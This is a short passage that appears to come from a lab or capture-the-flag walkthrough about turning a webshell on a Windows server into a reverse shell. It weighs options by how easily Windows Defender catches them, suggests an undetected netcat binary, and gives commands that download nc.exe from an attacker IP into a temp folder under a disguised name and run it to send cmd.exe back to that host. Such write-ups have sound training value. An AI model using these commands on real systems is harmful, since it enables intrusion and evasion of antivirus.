# Compiling Netcat & Reverse Shell

Now that we have our webshell, it's time to use it to get a full reverse shell. Unlike with Linux, Windows tends to be more difficult to get a reverse shell as Windows doesn't have as many scripting languages installed

There are a few options we can look at when trying to get a reverse shell in Windows. These include:
- Powershell: Whilst this is a fairly typical route, it tends to be very detectable by Windows Defender
- PHP Reverse Shell: We know that the server has PHP installed, however, like with powershell shells, they tend to be very detectable by Windows Defender
- MSFVenom: Again this is a fairly straight forward route but is fairly easily detectable by Windows Defender
- Netcat: Uploading a binary of netcat to the server is a fairly straight forward approach. The only thing to be careful of is to use a binary of nc that isn't known to Windows Defender as is the the case with the one that comes with Kali

We can get a copy of nc undetected by Kali with the following command: **git clone https://github.com/int0x33/nc.exe/**

curl http://10.50.193.137:80/nc.exe -o c:\\windows\\temp\\nc-gnome787.exe

powershell.exe c:\\windows\\temp\\nc-gnome787.exe 10.50.193.137 20000 -e cmd.exe